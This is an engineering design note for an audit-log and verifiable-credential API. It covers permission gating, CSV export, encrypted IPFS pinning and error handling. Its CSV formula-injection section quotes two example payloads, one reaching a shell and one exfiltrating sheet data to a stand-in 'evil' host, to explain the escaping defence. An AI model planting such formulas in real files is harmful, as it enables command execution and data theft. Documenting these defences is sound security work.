# Audit trail and verifiable credentials

The P2.6 surface: a queryable audit log over on-chain events, and issuance, verification and
revocation of W3C Verifiable Credentials. This document records what was built, and — more
usefully — the decisions where the obvious implementation would have been wrong.

---

## 1. The role question, settled

The build plan specifies `POST /credentials/issue (ISSUER, ...)`. **There is no `ISSUER`
role.** The role set is fixed at four by the problem statement and implemented in
`contracts/libraries/TrustChainRoles.sol` as `ADMIN`, `MANAGER`, `AUDITOR`, `USER`.

An API gate naming a role that `rolesOf` can never return is not a control — it is a
permanently closed door, or, depending on which way the comparison falls, a permanently open
one. So the routes gate on the **permission**, not the role:

| Route                      | Gate                     | Held by (default matrix) |
| -------------------------- | ------------------------ | ------------------------ |
| `POST /credentials/issue`  | `PERM_ISSUE_CREDENTIAL`  | ADMIN, MANAGER           |
| `POST /credentials/revoke` | `PERM_REVOKE_CREDENTIAL` | ADMIN, MANAGER           |
| `POST /credentials/verify` | _none — public_          | anyone                   |
| `GET /audit`               | `PERM_VIEW_AUDIT`        | ADMIN, AUDITOR           |
| `GET /audit/export.csv`    | `ADMIN` role             | ADMIN                    |

Gating on the permission rather than the role matters beyond naming. The contracts separate
the two precisely so an ADMIN can re-scope a role at runtime — "assign specific access rights
to each identity". A role-name gate would freeze a snapshot of that matrix into the API
process, so revoking audit access from AUDITOR on-chain would leave the door open here until
someone redeployed.

`PRD.md` §6.1 F3 has been corrected to match, with the mapping recorded inline.

`packages/backend/src/auth/roles.test.ts` parses `TrustChainRoles.sol`, `Permissions.sol` and
`ActionCodes.sol` and asserts every derived identifier against the Solidity. A rename on
either side fails the build rather than silently un-gating a route.

---

## 2. Authorization: three gates, deliberately different

`packages/backend/src/http/authorize.ts`

- **`requireSession`** — authentication only. Says who is calling, never what they may do.
- **`requireRole`** — judged against the session's role claims, which were read from the chain
  at sign-in and may be up to one access-token lifetime stale. Used for _reads_ only.
- **`requirePermission`** — re-reads `RoleAccessControl.hasPermission` at request time. Used
  for every mutation.

The split exists because of the platform's first hard rule: **only on-chain roles authorize
contract mutations**. A session token minted before a revocation still carries the revoked
role until it expires; honouring its claims for a mutation would mean the API granting access
the chain no longer does. `requirePermission` therefore ignores the session's claims entirely
— there is a test asserting exactly that, with claims saying ADMIN and the chain saying no.

**Failure is closed.** An unreachable RPC is a 503, never an allow. If we cannot ask who is
authorised, we do not guess. Same for a missing permission reader: the route refuses rather
than falling back to cached claims.

The contract enforces the same permission again when the transaction lands, so this is not
the last line of defence — it is the one that produces a clean 403 and a log line instead of
a reverted transaction and a wasted relayer fee.

---

## 3. `GET /audit`

### Sources: subgraph first, chain as fallback

`packages/backend/src/audit/events.ts`

The subgraph is fast and has already resolved transaction senders and made fields queryable.
What it cannot promise is currency — it lags the head and can stop indexing entirely — so the
chain is always wired as a fallback. An outage is the moment someone is _most_ likely to be
looking at an audit log.

One deliberate difference from the asset-provenance fallback: **an empty subgraph result is
not retried against the chain.** An audit query is a filtered search and "no entries matched"
is an ordinary answer; re-running every empty search as a full chain scan would make the
cheapest query the most expensive one. Only an actual failure falls through.

The response carries `source: "subgraph" | "chain"` so a degraded read is visible rather than
concealed. Presenting a possibly-stale answer as authoritative is the failure mode worth
avoiding.

The `getLogs` fallback walks backwards from the head in bounded windows, never below the
deployment block, with a ceiling on windows per query. Indexed arguments (`didHash`,
`actionCode`) are pushed down to the node; `actor` cannot be, so it is a post-filter.

### `actor` vs `via`

`AuditTrail.logAction` records `msg.sender`, which is **always a sibling system contract** —
that allowlist is what stops anyone forging entries. The human or service that initiated the
action is the transaction's sender.

Conflating the two would make the log useless: an auditor asking "who revoked this?" means the
account, not the contract that happened to write the row. So entries carry both — `via` (the
system contract) and `actor` (the initiating account, resolved from the transaction).

Transaction senders are resolved per unique transaction hash, not per entry: one transaction
commonly writes several entries. An unresolvable sender is reported as `null` rather than
guessed.

### Cursor pagination

`packages/backend/src/audit/cursor.ts`

Keyset, not offset. The cursor carries the last entry id seen. The audit trail is append-only,
so new entries arrive at exactly the end a reader is paging away from — an offset would
silently repeat or skip rows.

The cursor is **signed** (HMAC-SHA256, key derived from `FIELD_ENCRYPTION_KEY` via HKDF so it
never shares material with database ciphertext) and **bound to the filter it was issued for**.
Continuing a scan with different filters is a 400 rather than a page of results belonging to
neither query — without that, changing `actor` mid-scan produces output an auditor would
reasonably read as a complete history. Page size is excluded from the binding, since paging
with a different `limit` is a legitimate continuation.

### Filters

`actor`, `didHash`, `actionCode` or `action` (name), `from`, `to`, `limit`, `cursor`.

An unrecognised action name is a **400, not an ignored filter**. Silently dropping it would
answer "show me every revocation" with the entire log, and the caller could not distinguish
that from "nothing matched".

---

## 4. `GET /audit/export.csv`

ADMIN only — narrower than the read above, on purpose. Reading a page in a UI and walking off
with the whole ledger as a file are different acts; bulk extraction is what turns a
public-but-inconvenient record into a portable dossier.

### CSV formula injection

`packages/backend/src/audit/csv.ts`

A CSV is not an inert document. Excel, LibreOffice and Sheets evaluate any cell beginning with
`=`, `+`, `-` or `@` as a formula, and a formula can reach the shell
(`=cmd|'/c calc'!A1`) or exfiltrate the sheet (`=IMPORTXML("//evil/"&A1,"//x")`). The attacker
does not need to breach the API — they need one field on-chain that an ADMIN later exports and
opens.

Every field opening with a trigger character is prefixed with an apostrophe, which spreadsheets
read as "this is text". Tab and carriage return are triggers too, because some parsers strip
leading whitespace before the formula check.

Every field is quoted **unconditionally** rather than only when it appears to need it, so
there is no predicate to get wrong; internal quotes are doubled per RFC 4180. The test asserts
round-trip integrity — a payload containing CRLF, comma and quotes must come back byte-identical
after unescaping, which it cannot if it escaped its own quoting to forge a second row.

### Streaming and honesty about limits

The export is an async generator, fetched a page at a time and written through with
backpressure respected. Buffering a year of entries to build one string is how an export
endpoint becomes the way to run the API out of memory.

Two failure modes are written **into the file itself**:

- hitting `AUDIT_MAX_EXPORT_ROWS` appends `export truncated at N rows`;
- a source failure mid-stream appends `this file is incomplete`.

Headers are already sent by then, so the status code cannot change. A truncated export that
does not say it was truncated is a false record, which is worse than no export.

### The export is audited — off-chain, and why

Logged as `security.audit_exported` with the actor and the filters used.

**Not** on-chain, and this boundary is worth being explicit about: `AuditTrail` accepts writes
only from sibling system contracts, which is exactly what stops anyone forging entries. The
API is not, and must not become, a trusted caller — making it one to record its own exports
would hand an API compromise the ability to write arbitrary history. So an off-chain action
gets an off-chain record, shipped to the same aggregator as every other security event.

---

## 5. Credentials

### The shape of the thing

- The **credential** carries the claims and lives off-chain, as a signed JWT.
- The **chain** stores only `keccak256(jwt)` plus issuance and revocation state.
- A **verifier** hashes the credential they were handed and asks the chain about it.

So the chain answers "is this genuine, and still valid?" without ever learning what the
credential says — which is how the second hard rule (never store PII on-chain) holds in the
one place it is most tempting to break, since a credential is precisely the object made of
personal data.

The hash is taken over the compact JWT serialisation rather than a canonicalised JSON form. A
JWT is already a fixed byte string both parties possess verbatim, so there is nothing to
canonicalise and no chance of two implementations disagreeing about key ordering or Unicode
normalisation. Re-signing identical claims yields a different hash — correct, because it is a
different credential, and revoking one must not revoke the other.

### Separate signing keys

`CREDENTIAL_PRIVATE_KEY` / `CREDENTIAL_PUBLIC_KEY` are **not** the session `JWT_*` keys. A
session token is short-lived and only this API verifies it; a credential is long-lived and
verified by third parties who need the public half. Sharing one keypair would hand every
credential verifier the means to validate session tokens, and would chain a multi-year
rotation schedule to a seven-day one.

### IPFS pinning is encrypted — a deliberate deviation

The build plan says to pin the credential payload. **Pinning it as-is would be a serious
privacy failure**, and the reasoning is worth stating plainly: IPFS is a public
content-addressed network, so a pinned credential is world-readable to anyone who learns the
CID, and it is effectively permanent — unpinning removes our copy, not everyone else's.
Publishing it would defeat the entire reason the chain stores only a hash. The PII would have
moved one layer sideways, into a store with no access control and no delete.

So the payload is pinned **encrypted** (`packages/backend/src/credentials/envelope.ts`,
AES-256-GCM). IPFS gets durable, content-addressed availability; the plaintext stays readable
only to whoever holds the content key.

The content key is generated per credential, returned in the issuance response **once**, and
never stored by this service — not in the database, not in a log, not on-chain. A lost key
means a lost IPFS copy, which is acceptable because the holder already has the JWT itself: the
pin is durable backup, not the system of record.

The on-chain anchors (`credentialHash`, `schemaId`) are bound into the GCM tag as additional
authenticated data, so an envelope cannot be relabelled to claim it belongs to a different
credential.

### Issuance order

Build → sign → seal → pin → **anchor last**. A failure anywhere earlier leaves nothing
on-chain. An on-chain anchor for a credential that was never successfully stored is the one
outcome that cannot be undone.

### Verification is public, and reports two things separately

`POST /credentials/verify` requires no session, no role, no account. That is a requirement, not
an oversight: a credential whose validity can only be checked by someone with an account on the
issuing platform is not verifiable in any useful sense. It is rate limited per IP because it is
unauthenticated and does chain reads.

It accepts **either** the JWT or just the hash, and reports the signature check and the chain
status as separate fields rather than one boolean:

- the **signature** says the document is authentic and unaltered;
- the **chain** says whether it is still live.

Collapsing them would hide the difference between a forgery and a genuine credential revoked
this morning — and those call for very different responses from whoever is relying on it.

An unreachable registry is a **503, never "valid"**. There is no caching, deliberately:
"is this still valid?" is exactly the question whose answer changes without warning, and a
verifier acting on a cached "valid" after a revocation is the failure this registry exists to
prevent.

### Revocation

`PERM_REVOKE_CREDENTIAL`, and a non-zero reason code is mandatory — matching the contract. A
bare boolean tells an auditor something was revoked; a reason code tells them why, which is the
difference between a log and an audit.

Unknown credentials get 404 and already-revoked ones 409, checked before relaying, so a
pointless transaction is not paid for. The contract checks again regardless; this is a
courtesy, not the control.

---

## 6. A defect found and fixed along the way

Writing the "pinning fails" test surfaced a real bug affecting **every** async route in the
service, not just the new ones: **Express 4 does not await handlers**, so a rejected promise
never reaches the error pipeline. The request received no response at all and hung until the
client timed out, while the process logged an unhandled rejection. A Pinata outage would have
produced an accumulating pile of stuck connections rather than a clean error.

Fixed with `asyncHandler` (forwards rejections to `next`) plus a terminal `errorHandler`, both
in `packages/backend/src/http/middleware.ts`, and applied to the assets and profiles routes as
well since they carried the same latent defect. The error handler returns only
`{ error: "internal_error", requestId }` — a stack trace or driver message in a response body
names the database, the ORM, sometimes a file path. The detail goes to the log, where an
operator can find it by request id.

---

## 7. Wiring, and what is not yet proven

`packages/backend/src/index.ts` now mounts `/audit` and `/credentials` for the real process,
using a session resolver (`auth/session.ts`) that **verifies** the access-token cookie rather
than decoding it — an unverified JWT is a client-supplied JSON blob, and treating its `roles`
claim as authorization would let anyone mint an ADMIN session with a text editor.

Credential routes are **not mounted** when no relayer is configured, and the process says so at
boot. Mounting them without one would authenticate, authorise, sign a credential and then fail
at the last step — having already handed the caller a JWT for a credential that was never
anchored.

### Honest limitations

- **No subgraph exists yet.** `SubgraphAuditSource` is written against a schema
  (`auditEntries` with `entryId`, `actor`, `via`, …) that nothing currently serves. It is
  tested against a fake, and the chain fallback is the path that actually works today. The
  subgraph manifest is Phase 5 work.
- **Signing now goes through a self-hosted OpenZeppelin Relayer**, not Defender, which was
  removed when it entered maintenance mode. See [RELAYER.md](RELAYER.md).
- **CORS is still not mounted** (carried over from P2.5). The frontend will need it in Phase 3.
- **The Nginx config remains unexecuted** (carried over from P2.5), including the new
  `/audit/export.csv` path, which streams and should not be buffered by the proxy.

### Environment variables added

```
CREDENTIAL_PRIVATE_KEY, CREDENTIAL_PUBLIC_KEY, CREDENTIAL_ISSUER_ID
SUBGRAPH_URL, AUDIT_TRAIL_DEPLOYMENT_BLOCK, AUDIT_MAX_EXPORT_ROWS
RELAYER_URL, RELAYER_ID, RELAYER_API_KEY, RELAYER_SPEED
POLYGON_AMOY_RPC_URL
```

All are in `packages/backend/.env.example`. No new dependencies were added.
